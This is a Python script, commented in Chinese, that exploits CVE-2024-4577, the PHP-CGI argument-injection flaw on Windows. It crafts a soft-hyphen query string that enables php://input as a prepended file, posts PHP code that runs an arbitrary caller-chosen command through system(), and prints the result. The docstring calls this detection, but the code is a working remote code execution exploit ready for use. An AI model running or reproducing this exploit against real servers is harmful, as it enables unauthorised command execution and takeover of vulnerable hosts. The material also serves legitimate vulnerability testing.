"""

 * @author:程
 * @DateTime:2024/7/27 15:56

"""
import re
import requests

def CVE_2024_4577(url,exec_command="whoami"):
    """
    检测CVE-2024-4577漏洞在给定URL上的存在性。

    Args:
    - url: 待检测的URL

    Returns:
    - 检测结果消息
    """
    global host
    try:
        # 确保URL以 '/' 结尾
        if not url.endswith('/'):
            url += '/'

        # 判断是提取 "//" 后面的内容还是 "/" 前面的内容
        if url.startswith("http://") or url.startswith("https://"):
            # 提取 "//" 后面的内容，直到遇到 ":" 或 "/"
            match_after_double_slash = re.search(r'//([^:/]+)', url)
            if match_after_double_slash:
                host = match_after_double_slash.group(1)
        else:
            # 提取 "/" 前面的内容
            match_before_slash = re.search(r'^(.+?)/', url)
            if match_before_slash:
                host = match_before_slash.group(1)

        # HTTP请求头部
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
            'Host': host
        }

        # 构造利用PHP-CGI漏洞的URI
        uri = '/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
        target_url = url + uri

        # PHP代码，用于执行指定的 exec_command 命令
        php_code = f'<?php system("echo. && echo. && echo. && echo. && echo. && {exec_command} && echo. && echo. && echo. && echo. && echo."); ?>'

        # 发送POST请求，将PHP代码作为数据传递
        response = requests.post(target_url, headers=headers, data=php_code)

        # 输出响应内容
        if response.status_code // 100 == 2 or response.status_code // 100 == 3:
            empty_lines = 0
            first_empty_group = False
            second_empty_group = False

            for line in response.text.split('\n'):
                if line.strip() == "":
                    empty_lines += 1
                else:
                    if empty_lines >= 5 and not first_empty_group:
                        first_empty_group = True
                    elif empty_lines >= 5 and first_empty_group:
                        second_empty_group = True

                    if not second_empty_group:
                        print(line)

                    if second_empty_group:
                        break

                    empty_lines = 0

    except Exception as e:
        print(f"发生异常: {str(e)}")

if __name__ == '__main__':
    CVE_2024_4577("","")